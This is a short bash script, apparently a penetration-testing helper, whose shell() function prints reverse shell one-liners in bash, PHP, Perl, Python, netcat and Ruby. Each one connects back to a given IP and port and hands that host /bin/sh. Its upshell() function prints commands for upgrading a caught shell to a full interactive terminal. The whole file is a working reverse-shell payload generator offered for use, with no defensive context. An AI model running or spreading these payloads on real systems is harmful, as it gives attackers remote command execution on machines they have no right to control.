#!/bin/bash
shell(){
	shellType=$1
	port=$3
	ip=$2
	#iface=$2
	#ip=$(ip a show $iface 2>/dev/null| grep -oPm1 '(([\d.]).*)\/')
	#ip=${ip::-1}

	randchar=$(cat /dev/urandom| tr -dc 'a-zA-Z'|head -c 1)
	if [[ $shellType == "bash" ]]; then
	  echo "0<&196;exec 196<>/dev/tcp/$ip/$port; sh <&196 >&196 2>&196"
	  echo "exec 5<>/dev/tcp/$ip/$port;while read line 0<&5; do \$line 2>&5 >&5; done"
	  echo "bash -i >& /dev/tcp/$ip/$port 0>&1"
	elif [[ $shellType == "php" ]]; then
	  echo "php -r '\$sock=fsockopen(\"$ip\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
	elif [[ $shellType == "perl" ]]; then
	  echo "perl -e 'use Socket;\$i=\"$ip\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
	elif [[ $shellType == "py" ]]; then
	  echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
	elif [[ $shellType == "nc" ]]; then
	  echo "rm /tmp/$randchar;mkfifo /tmp/$randchar;cat /tmp/$randchar|/bin/sh -i 2>&1|nc $ip $port >/tmp/$randchar"
	elif [[ $shellType == "ruby" ]]; then
	  echo "ruby -rsocket -e'f=TCPSocket.open(\"$ip\",$port).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
	else
	  echo "shell not found!!"
	fi
}
upshell(){
	echo python -c "'import pty;pty.spawn(\"/bin/bash\")'"
	echo stty raw -echo
	echo export SHELL=bash
	echo export TERM=xterm-256color
	rows=$(stty size | cut -d' ' -f1)
	cols=$(stty size | cut -d' ' -f2)
	echo stty rows $rows columns $cols
	echo reset
}
